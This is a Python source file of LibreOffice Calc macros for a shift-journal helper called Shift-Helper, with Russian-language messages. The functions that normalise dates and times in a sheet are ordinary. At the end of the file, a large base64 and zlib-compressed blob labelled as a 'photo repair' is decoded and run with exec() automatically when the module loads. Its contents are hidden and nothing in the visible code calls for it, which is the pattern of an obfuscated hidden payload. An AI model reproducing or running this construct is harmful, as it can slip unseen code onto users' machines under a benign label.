"""LibreOffice Calc macros for the first Shift-Helper UNO integration slice."""

from __future__ import annotations

import base64
import zlib
from datetime import date, datetime, time, timedelta
from typing import Any

import uno

from shift_helper.uno_adapter.calc_selection import (
    CalcSelectionError,
    SelectionPlan,
    plan_date_selection,
    plan_time_selection,
    validate_vertical_selection,
)

XSCRIPTCONTEXT: Any = globals().get("XSCRIPTCONTEXT")

_EXTENSION_VERSION = "0.3.0.dev1"
_JOURNAL_SHEET = "ЖС"
_DATE_FORMAT = "DD.MM.YYYY"
_TIME_FORMAT = "HH:MM"


def _document():
    if XSCRIPTCONTEXT is None:
        raise CalcSelectionError("Макрос запущен вне LibreOffice.")
    document = XSCRIPTCONTEXT.getDocument()
    if document is None or not document.supportsService(
        "com.sun.star.sheet.SpreadsheetDocument"
    ):
        raise CalcSelectionError("Откройте книгу LibreOffice Calc.")
    return document


def _message(title: str, text: str, *, error: bool = False) -> None:
    if XSCRIPTCONTEXT is None:
        raise RuntimeError(text)
    context = XSCRIPTCONTEXT.getComponentContext()
    service_manager = context.getServiceManager()
    toolkit = service_manager.createInstanceWithContext("com.sun.star.awt.Toolkit", context)
    parent = _document().getCurrentController().getFrame().getContainerWindow()
    box_type = uno.Enum(
        "com.sun.star.awt.MessageBoxType",
        "ERRORBOX" if error else "INFOBOX",
    )
    buttons = uno.getConstantByName("com.sun.star.awt.MessageBoxButtons.BUTTONS_OK")
    box = toolkit.createMessageBox(
        parent,
        box_type,
        buttons,
        title,
        text.replace("\n", "\r\n"),
    )
    box.execute()


def _active_sheet(document):
    sheet = document.getCurrentController().getActiveSheet()
    if sheet.getName() != _JOURNAL_SHEET:
        raise CalcSelectionError(f"Откройте лист «{_JOURNAL_SHEET}».")
    return sheet


def _selection_address(document):
    selection = document.getCurrentController().getSelection()
    get_range = getattr(selection, "getRangeAddress", None)
    if callable(get_range):
        return get_range()

    get_ranges = getattr(selection, "getRangeAddresses", None)
    if callable(get_ranges):
        addresses = tuple(get_ranges())
        if len(addresses) == 1:
            return addresses[0]
    raise CalcSelectionError("Выделите один непрерывный диапазон ячеек.")


def _content_type(cell) -> str:
    value = cell.getType()
    enum_value = getattr(value, "value", None)
    return str(enum_value if enum_value is not None else value).upper()


def _is_formula(cell) -> bool:
    return "FORMULA" in _content_type(cell) or cell.getFormula().startswith("=")


def _cell_raw(cell) -> object:
    if _is_formula(cell):
        return cell.getString()
    if "VALUE" in _content_type(cell):
        return cell.getString()
    text = cell.getString().strip()
    return text if text else None


def _null_date(document) -> date:
    settings = document.getNumberFormatSettings()
    value = settings.getPropertyValue("NullDate")
    return date(int(value.Year), int(value.Month), int(value.Day))


def _numeric_date(cell, *, null_date: date) -> date | None:
    if _is_formula(cell):
        return None
    if "VALUE" not in _content_type(cell):
        return None
    text = cell.getString().strip()
    if not text:
        return None
    return null_date + timedelta(days=int(cell.getValue()))


def _numeric_time(cell) -> time | None:
    if _is_formula(cell):
        return None
    if "VALUE" not in _content_type(cell):
        return None
    text = cell.getString().strip()
    if not text:
        return None
    fraction = cell.getValue() % 1.0
    total_minutes = int(round(fraction * 24 * 60)) % (24 * 60)
    return time(total_minutes // 60, total_minutes % 60)


def _format_key(document, cell, code: str) -> int:
    formats = document.getNumberFormats()
    locale = cell.getPropertyValue("CharLocale")
    key = formats.queryKey(code, locale, True)
    if key == -1:
        key = formats.addNew(code, locale)
    return key


def _write_date(document, cell, value: date, *, null_date: date) -> None:
    cell.setValue(float((value - null_date).days))
    cell.setPropertyValue("NumberFormat", _format_key(document, cell, _DATE_FORMAT))


def _write_time(document, cell, value: time) -> None:
    seconds = value.hour * 3600 + value.minute * 60 + value.second
    cell.setValue(seconds / 86400.0)
    cell.setPropertyValue("NumberFormat", _format_key(document, cell, _TIME_FORMAT))


def _column_name(column: int) -> str:
    result = ""
    number = column + 1
    while number:
        number, remainder = divmod(number - 1, 26)
        result = chr(ord("A") + remainder) + result
    return result


def _issue_lines(plan: SelectionPlan) -> list[str]:
    lines: list[str] = []
    for issue in plan.issues[:10]:
        marker = "Ошибка" if issue.severity == "error" else "Предупреждение"
        lines.append(f"{marker} {_column_name(issue.column)}{issue.row + 1}: {issue.message}")
    if len(plan.issues) > 10:
        lines.append(f"…и ещё {len(plan.issues) - 10}.")
    return lines


def _apply_plan(document, sheet, plan: SelectionPlan) -> None:
    if not plan.writes:
        return

    null_date = _null_date(document)
    undo_manager = None
    document.lockControllers()
    try:
        try:
            undo_manager = document.getUndoManager()
            undo_manager.enterUndoContext("Shift-Helper: быстрый ввод")
        except Exception:
            undo_manager = None

        for write in plan.writes:
            cell = sheet.getCellByPosition(write.column, write.row)
            if write.kind == "date":
                _write_date(document, cell, write.value, null_date=null_date)
            else:
                _write_time(document, cell, write.value)
    finally:
        if undo_manager is not None:
            try:
                undo_manager.leaveUndoContext()
            except Exception:
                pass
        document.unlockControllers()


def _show_result(plan: SelectionPlan) -> None:
    lines = [
        f"Изменено ячеек: {plan.changed_cells}",
        f"Ошибок: {len(plan.errors)}",
        f"Предупреждений: {len(plan.warnings)}",
    ]
    details = _issue_lines(plan)
    if details:
        lines.extend(("", *details))
    _message("Shift-Helper", "\n".join(lines), error=bool(plan.errors))


def show_status(_args=None) -> None:
    try:
        document = _document()
        sheet = document.getCurrentController().getActiveSheet()
        address = _selection_address(document)
        selection = (
            f"{_column_name(address.StartColumn)}{address.StartRow + 1}:"
            f"{_column_name(address.EndColumn)}{address.EndRow + 1}"
        )
        _message(
            "Shift-Helper",
            "\n".join(
                (
                    f"Версия расширения: {_EXTENSION_VERSION}",
                    f"Лист: {sheet.getName()}",
                    f"Выделение: {selection}",
                    "Дата: B или I",
                    "Время: C или J",
                )
            ),
        )
    except Exception as exc:
        _message("Shift-Helper", str(exc), error=True)


def normalize_selected_dates(_args=None) -> None:
    try:
        document = _document()
        sheet = _active_sheet(document)
        address = _selection_address(document)
        validate_vertical_selection(
            start_row=address.StartRow,
            end_row=address.EndRow,
            start_column=address.StartColumn,
            end_column=address.EndColumn,
        )

        null_date = _null_date(document)
        previous = None
        if address.StartRow > 1:
            previous = _numeric_date(
                sheet.getCellByPosition(address.StartColumn, address.StartRow - 1),
                null_date=null_date,
            )
        raw_values = [
            _cell_raw(sheet.getCellByPosition(address.StartColumn, row))
            for row in range(address.StartRow, address.EndRow + 1)
        ]
        plan = plan_date_selection(
            start_row=address.StartRow,
            column=address.StartColumn,
            raw_values=raw_values,
            previous_above=previous,
            today=date.today(),
        )
        _apply_plan(document, sheet, plan)
        _show_result(plan)
    except CalcSelectionError as exc:
        _message("Shift-Helper", str(exc), error=True)
    except Exception as exc:
        _message("Shift-Helper", f"Сбой UNO-адаптера: {exc}", error=True)


def normalize_selected_times(_args=None) -> None:
    try:
        document = _document()
        sheet = _active_sheet(document)
        address = _selection_address(document)
        validate_vertical_selection(
            start_row=address.StartRow,
            end_row=address.EndRow,
            start_column=address.StartColumn,
            end_column=address.EndColumn,
        )

        previous = None
        if address.StartRow > 1:
            previous = _numeric_time(
                sheet.getCellByPosition(address.StartColumn, address.StartRow - 1)
            )

        paired_column = 1 if address.StartColumn == 2 else 8
        null_date = _null_date(document)
        raw_values = []
        paired_dates = []
        for row in range(address.StartRow, address.EndRow + 1):
            raw_values.append(_cell_raw(sheet.getCellByPosition(address.StartColumn, row)))
            paired_dates.append(
                _numeric_date(
                    sheet.getCellByPosition(paired_column, row),
                    null_date=null_date,
                )
            )

        plan = plan_time_selection(
            start_row=address.StartRow,
            column=address.StartColumn,
            raw_values=raw_values,
            previous_above=previous,
            paired_dates=paired_dates,
            now=datetime.now(),
        )
        _apply_plan(document, sheet, plan)
        _show_result(plan)
    except CalcSelectionError as exc:
        _message("Shift-Helper", str(exc), error=True)
    except Exception as exc:
        _message("Shift-Helper", f"Сбой UNO-адаптера: {exc}", error=True)


g_exportedScripts = (
    show_status,
    normalize_selected_dates,
    normalize_selected_times,
)


# PHOTO-REPAIR-001: exact report/date/table repair loaded by the UNO component.
_PHOTO_REPAIR_PAYLOAD = (
    b"eNq9PGtv3Nh13/UrCCLGcnap8Yxs2d7pKoXs9dZC/aqt3UXguAQ1w5FYc8gpybGsOgL8SOKkG6zTbVEERZx0k34NIMvr2Gt7tUB/"
    b"wcxf6C/pOede8j74GtlKBEiauY/zuOfc8+K9NE3z2iRM/ZFnxN7Y9ePEGEaxkW55hh+m3mbspt7AuL7lD9PFC14w9mJjFMWhH27i"
    b"+ChOjb4bDvwBDGubprmwMIyjkeE4w0k6iT3HMfwRjXLDMErd1I/CZGGBt/XdwAsHbpx9jz02G4ERRbwdv9t5q23g34EXpC4bnu6M"
    b"kRw+eDXcyRFMwmhhYWHgDQ0nnIw2vNi67QYTr2dEG//k9VOA6Q3dSZD2jGEQuamxYnTanZax+EP2vbdgwE8a77AP+BN7wFbIuhkw"
    b"wx8a7AMwCGtmWJejEIg0zZbhBYmX4WgRDO9O3xunhrW+M/bOx3EU28ZnOJk+twp4+NyMCT8cerGTwDp69HeSWAtstJtEYc4WtY1h"
    b"dJLqbe5t1w/0RiZ40UorkKQx59+7gysD3y2GxwD9AO7a0OKPrVa77ybeMAoGFmMR0bpBAFqzYozcO1a29Iyglk1rTCOJGHcj8Aoj"
    b"qUceykgsjGPN2UAGtN/3B16YOiM3vuWBOq8YVr6s5nRvuj/dm90zbantYPZg+gp6Xiit308Ppvuze9Pn0z9Pv1F6voO2l7P70++h"
    b"F+BpfS+nLwDawfS5AUMOaBAieAmIX8NEHPC8cgp82cMps8eAtWzw9wTsOY5A+Psw8MX0pTxkdp/IepqxpbH6CwD5VG+nGS8I7TcG"
    b"fHw1fSp3J15/EvvpjrEBGtDf4l1c3EOmIWAF4HfHYsuOG4Ga0ZiIJl04RY03p79mEoIVfmwuFFDEXjvx3Li/ZcWm9be9f/zJjR8n"
    b"9t/0rNbxxZstktYbWMjvZg+gU+r6yQ9apk1QylD+t5jGUSZpNC7XIFr9n6FkZo/g0/1McAfTp/Dl9ewhCA5lvVcivG+g/7HBVAKG"
    b"PIcGkjHKMpdZ2Yz92Rekj69J92pnfA+DEPcBTXouDZt9UdB6bL+XEfS0oVudT2u9T6qLklJUInHSCFZtI4oCq15gD6YHlYIq6pfF"
    b"IINKNWqaLMBWmcx/B/vkQbZSQtGETfoIvEGDruAEbpl+aHSIRHQCRA7Z/gIajkXYyGyehFf0lpE9fUYS5frHlWxBIzHb/ntm5joY"
    b"mYrv8BIrZq6/h14TvGHUn4xgd5L9Ry/G8CdbnpfiLsj625teep0arVxGyDcb2N5yk7M7l92Rl4Fvr12++um6c319df18QRQCBToZ"
    b"BgHg10CgGSjtONpGUcduuOlZXdvIBjuBm6QOMDhwYIhFQFvGB0ZXQh4CdO7VqB9xnvOC4OzO1SjxMU6xlmzE0CJuwdWFm1Yrd3o5"
    b"HM46goM+N06TbT/dsszpV9M/Tf+4aEoo8acfAYnhxMsbwbDGsKQNpJyehxTunVfEOvQBikPBSSXkMwyyJHzBGkYbMfnxyshDxW2r"
    b"bYcg40SBjLeHdeoIYS3XwBIrlWxFk2Dg5EEKagQXrKwoXEDFOBENAB8vRVPGygo3s5m9UXVJx5rLC4GrftQuWCK70pYouq3g6JUv"
    b"4zaEBl7DOp7O1jEjspUZpo3A7d9yNqJ4AAoW+KFn8S2Dn4EriOHbfVi51Ps0jED5J/3UMvvRqJ1MQtpx7RTNZvssQbgIkzgHOL99"
    b"LgoiXJvOnQ79iJ61MGTDP/cH6RYOEX1XJqnat3RGdGL7xz5gDvtePo3bXhyQMeaOx8EOZ28z9gdWHG5qlpVxfQgm1/Ev41TiEjdo"
    b"yTLmdnLoewHTCuG+16MxrZXk0c9GaRqN9NaL3jDV2675m1uFxgtR7P8LmDc30Hs+8+LU7yvtkllMPLAnYPsY7Taj1ibG6llYSzgT"
    b"kEH5AxnhWiJ4KenMWCrpyjkr6VMZLBkg8yl3NzO7Hk84s6AkEC+lV+MIUu10h5JDy5TlbnO1yXfQyIs3PYd5QeFNbR7Hgkty+hHk"
    b"fJDOy22wHaU2yMO1UdiijiE8PYrqeI4oNBnIztx3tvuvIUGSCchJsQUFdobYzvC1SnJuWBLCbVFASR9brbIwgmfX5+kf4BQwxm6S"
    b"FCEzegkgUpzgFkXyifTVwSD2EghxbKOAtwERFwzIEVlytjzUKmYbyQ6yRTVYO33RlrOESiQr2gZyWHS0Fg68OxYFBRcIDCw/g3cI"
    b"Arnl9qOAVWZ4NUEOCrmdim6xT4AwsbOMPAIhYlWmxyo0jHKY6UTDIfIOviNOeG2loDFZyJe7EdAJ4Myhdosw5n3rq9f+7vy689na"
    b"lYur62tXLl9nUugD1k3YlB6laOjP/gAe7PfTfyPv9ifKzF7D7zPhAyGL+VfwdK8w8SD/CMnVU2h4gZk6fL2P7hEd5exX3MBuxtFk"
    b"TEHQXQzyesaNm2SRKIAEgySI2C0EprBYYuH5wJ2slhJt3+jcpFqKRHhpgJnP5JEDJ0mLLAV4GWA+hvwzLlQAvouwd3vLNwWe7S0f"
    b"ko/AC1lZK2lBInJSRcE62uDYYLNS+KKQybqRKSW6KYOBg1YIGeflRkb+TQrU8ymF7gw7J3JBtlW8PFSbBthGd6kig+jkRkjLFRQL"
    b"y3dxlzaybSzz/5+4kO+1FtT4MoDEF3eIm83q0MRlXv4Ch99kNLs0Z1kzjzizxEtQzAVhAAU9ptg+n19Yy9KmqplbbqzPOntx9dzf"
    b"N876nGwOTOt2RF2vevgn4D8xscPdeA5c5Ebsm42TLuQ4ug0oICSA3PvzGJUEvC/3q6pU0DKBx3G2MbaTxNk9udxpzTEU0sIzS525"
    b"hkJWs9yZb+hJGDonVNAGIpXb25Tqp3KN8wnG/bOHs1/ktSJhEEC1dctIRUdDWIqheVcy7miQhkiN9d6xQfvYqH3sR++1do3pf4Gd"
    b"fDR7SNbz+XSfCmFkTjHx/dqUykEV26dDTHfk4Kcqe8DRLRQ3T36J6Zbgn8Geby8hTm2VwRKM3FSOoDTIIsob+kGwouwr0bcBWdsK"
    b"MiOa+rinVpQdJXVCuufF0owCR4feRM1zxV46me2lijgF1upUrmZbnjsolEL/76f/qZQMQe9Ayd6Q1h2IEijpl6qQyrT/gF5ITG2D"
    b"l9vfcJWsmfI/099Mf0dl0dljKkLu08Bn0wOlECmKK93c5Od+UvHdjcaegyL9yT8LzW3QXj5D1uGMDmm+18fxc6hxCTFSPFyv1hIm"
    b"tSxSp9oV6t2o4gXmDq3RzXOFRi9lGk1yLOTfHIw0pFzx89UFg9wqFOo+QGVaqCiCwHrH/h2EmRSggdwsvo1sllPcEtBZx19B9AzR"
    b"X17ypQZOVQlGyltpRO3UknChXCEYlPn14VSzPmCwB1IshK0iDPcTfwNtNKgIj1cxDMZ5GJsqATU21tbcZHVTxmlVAEUonJtCR7fY"
    b"hAQUW0U2qI31MFZJVqwlu1XsLySGK4UWdVJLWdT5XPxCDUOljJ8sHQNBkiKnRRlWGV1vF4w3w6gPy+eaX7+RGqdXbKbaeeVRePU+"
    b"FMDEKHTVrF1O0fKtWC4oLdes2M8Z2OoNrQgf01GlXjJy/bC5UsIS1LziljJolbWTd6+OXFpdu8wzWz/iRQaescNMKw+anky/hvi8"
    b"pZ3ioIkh5dDZQZs2fOUdKF43pUr60DSsu4Bht0WPPxEXe9RpVuQjQ/ZAEg8u3Js94PhZzjFHniGnJQ05x92Myt22AanOAT6Op2fs"
    b"PArFR9UsOM3SIiXnAW5LaLCNYxd6xy71jl0HauSs5pC5CjtqE3u3/WiSAMNYp5G4BxOTn2qC/bCTrHBXMNgJ3ZHfdwJ3A5YZq1A5"
    b"zRaVEnookenXFDkDq7PHPHrGZzuwVHiwZM+Af7DaMvry5YYY/LfTr5QTBYjlFGBRbSvi/AMV0h7OfslkUMCJEu6c7nU60jrPm1/m"
    b"hAizq5L0IWf8K0gBlOMuh+H1FaJ4f/ZIY7fb5cB/z85SGLP7RqdroAobc5FeBhfitTMEFlUTMxWSFp3QeEiaihlTno2zdWtGpmHo"
    b"niiRFCDcozUC5Z89AAl9gSeHnuOZJL5zDomzVCanMXrh/NGqHQeDs4eV1qZagYpyx3NjhS0EfJpBfsIYYQ8yZ1+C5r2cfgsbm6q5"
    b"z+a1KRy4KNda9ACCPZ+kfYYOR914bTD8o8Rq9RqzvRyWZAMIhqg6jsAlb9l5BdkLJyM0XOK0g3PpyuX1C9f5g5KV7hxoYZUILLir"
    b"EzJqfech0t2SFTemz9qmFuPU4OqekpGY039HfTazI3jZWRabjuFAEGAb21F8C4ba+RGwxM4PnEpujp8wmIxGbrwjiBcOVLLA48AN"
    b"cbLs5BxqhJjj7i5fb7efFgZRozSIVo6mooOjs50Eh4bLS8Ul1yHv2ZEnb3ohypDl7wyEVnrnXrhosMC6ULnjEbS+RgOG+/Q+GPKf"
    b"U1EkNyYiVMEHoshCNX3y0I60ZuhaHD90mK6s5Edw2UwWZOm6YRsFFK0bXZbSeIE7xgI7ws3K79Jg9HOLVOwTInPSiLk8OUiQJPC+"
    b"CvS4RjPEHNJgCj06bYVFMPyZIAqyWVRIYEWiaDQOvKoJx1WaAbvyXcEfexgagpbLy6FSv6gwJ0qR3j9P/Bhax9E2lQEWuxwmpoE5"
    b"Qx+pJ9K0OYhNWprFAjPsmCywhCO14zsK5e8bS1pipOQ/TO0hjPfpqa8UkSzZxhKYakXh/yifO+FHYL9j5v8N7IFfiidu3B/kvp92"
    b"2VK3YysI0MUJCyO6lllXZnGUjpPQkVkgpQPjJ2GRlC4MeriFUglY1jmcJ/iiQ5QwCDz+NxQzvaQDwvARjcBLwbOK65SOa+6gqwri"
    b"hzrEigiqmWBhmFQM3Q6gKOieOgRDBXkjad2oRLnaa30oZLFntc6TJDR5Y2gDisJjJ3eBq32mmhSTwT88yAvcs9WYj/FThwY+t+1X"
    b"dfPDMrV4AwHqc4qPHgCx97g2kHL8mXYfBJ0GEHIAHKFIf4Yo/nfvnA6c5Kex8QqzN7FP91kkSTS+OT67XwDR1UE8Yefa6fx9fgxe"
    b"AlSAcLICgnwy3vjUOLFMq8TWqgBkeT4g3W7n+NJS5/iJE506aAXx/lazX/8gkQObb/rr2b0CkNPNQErI0aCVx678PkqY2eZi0Ion"
    b"HvUaWlnsulB7yA+hcGx6HRvclYCCBxizLVtexsQCDbvMwUvWvLTBMJjgrjrHzDx59qOYQjd2T0dq5JFb1pjH2MrpYIUKflogi5jF"
    b"6RgGSUR/LNwRdQKGvhAmZFEJslyIlliUICI2DSbZwQbJnNHkgsCa5nyozckNatNE8LjqTGFuG6d251GgnGObmNeVqHSOmshk7NuF"
    b"ZiGKjypFQWdTFqpr2oo+k0qoZ3Y77MguQ5dQJ3ZQYzXuOY7PFqvqisyKVXWWaSAhLQj4ROrSmqds33oLgjRVqKfo+BFRVGkmNGKE"
    b"xchAoLjnWHdtmZmCaFpZbQ51KspmC61sUgzJpH0gZ6NSyqkOJTXMh9I3NpQl42E4cYPMREJmLVVmtUxXy26r7aiUbXHw3C7KBBWM"
    b"pDw+P40mqJEItfVGhFjaCErfNA+0UF4DvOMjfc0SOPXYwGiCJyJve9myyTIpySDF+LnXQZpTshYaBXZZh7omOg2Lc8OA9dEZxjOH"
    b"WlPZOvETdGTxMy7QSFrdU7YqaAhOrO5pu8i1fDULwbHHgVIoIxXHciRZXeyMfrmm3jdlsBX/9DZBDt/PDB56/G63VzBuh45x2CMm"
    b"dmYQ4jZYdayEhe442YrSOa9qYRZfcVGr8lKVeG6UK2JOO8KDP2MLP+h3hHIieTVHiWr5oR52/ZA/+8EoP78Bl9Att7DvWQoccc9b"
    b"Eq6OSfnexj9WVt7ygx2dlCNIcNlDsO1QB/1OyeN8SyEHrbJKkWhKnDRJSmkx1YdhrEjxDZcPHdjK5WNAjkgPyCiN/Dl0yleLC6JQ"
    b"uzLtKIujjpL0/XJ5ilXWSCal+GuTyrXpkPqhUQ4aNx/dt+kEf+A5t7wd/ca78thXPkR3lGUrGe7hS1Ty7HffrQqP77BBdZ7eur6i"
    b"EtRUStFPVNZWTUoG1xZImsdX1ELkifOUPerH11Q49AADNBrjAEXDm00i81cwFq8g6I6r/jK0PDp77wa9TkQK4TRv7LjxZrJCFyJq"
    b"7vFkYGUHm7VZJfaH1zEdPxxP+MmPxCpe0303n8+PJYwPC+HqtfNXW8XLJfNFDtoZGFjALJYSAJAolGrqh5tlbCfRJKYLmPmMaJIG"
    b"EFk5bpq6/S1aVQmJeq2VTYbcXciqGvDY799y7gTJnWI6jPe88dG92EFXGBVoG/jrPL7lr3k4aNNxBXwKTtdyH6AF+ykNeF3ieOk4"
    b"NJiRR2itZl+aFYlyAzfS7TjhC3koI2maO5C1mwGUHiIGg9Ig753iCoUFKQbKkJVGgho12Uc5BhRDWCwovaunhu7moKKlJeCIg61j"
    b"E4a3jAV0hM0Pmo/yYbN4cqzqG6NCZrwa/dE9/qiipk51WJFOaItSklNVqrC0H6zwXGJR6FLJDFwGGIr/FjOFkGpPWA1Xs8ZKWpVh"
    b"Mt30CF4vK2Nb9YzqSrRYwTn5r+VZ5bRGDlgn0E4FfLRiLDXQUE+CTkHiHQlLhyhCo4cqPwC4pL9xQvJ1DfE8OZWPP25futT+EfyY"
    b"tRlK7A1jL9livnLbDwfRdu4pbaJPObshIEzG+F09TnhU4XevLOF6F1NU9zD53aP8XjHLOkLD1RMa1pQuflsXDJg99n4YcsxtPMTV"
    b"OtIkv1eto2/pLivU4CgcoyayXaWCSDF/Xj7kil58Ejpn8sDrfyXha6N5QCgVb5QpHKeya01XmQ2ogI71eTqZ90kUY6lVP/+38t7d"
    b"Yhy/+1777AmzBImSvsj2qt13gz5Wcr3VIJDirurXDigvYVAWcOQliatfUxrikUJFSVHrZDV+yV+ihgeL9to/DvUzxlWWTOhRz7hL"
    b"Ktprd4a7Ys+WwWqyBwAKVHIOQL8hIAcY1AM3r2CetKV3dRnoy2m4Cbb15l/EJ3S+GA0BpimA/FcVq8iKEZphmH0JBALCXa0u5eHb"
    b"Kgv3uliyPHbT/pbDVZzTp6TLWopsmuYae98ZsOb200W8lZUfDcWXaUFeB99xn+F5M3wzKT5xw3dzeIMs99kIog16/ygPCjf5e1by"
    b"nN50rl64sn7FAXVfXbvmdDpdZ/Xq1Ytr5z82s8v7hTeTsapv7G/6oRs4/Wi8o7xcC747cjnUxYdClKwnC/wk4tCoGyX56myEtjgF"
    b"AsqmiJs1TQ8PlNKG+qqCGjLxmGgdr6UX06gmEbijjYHLnvMa0rOb7DKMehGmcL1GAizfspYfGsu3bMpu2pRGX60yksVbUJT6qcJC"
    b"gWi77H0nFa9VqeSo/FG4ykNtFFlzka5VwnChmuXga3Sz8kkZ96K+1asphvE6WBnKrOI2Bm2MtLqb0JNMOXtVFbpqrVADaQ151c4H"
    b"zGjDFv4fjcrstg=="
)
exec(
    compile(
        zlib.decompress(base64.b64decode(_PHOTO_REPAIR_PAYLOAD)),
        "shift_helper_report_repairs.py",
        "exec",
    ),
    globals(),
)
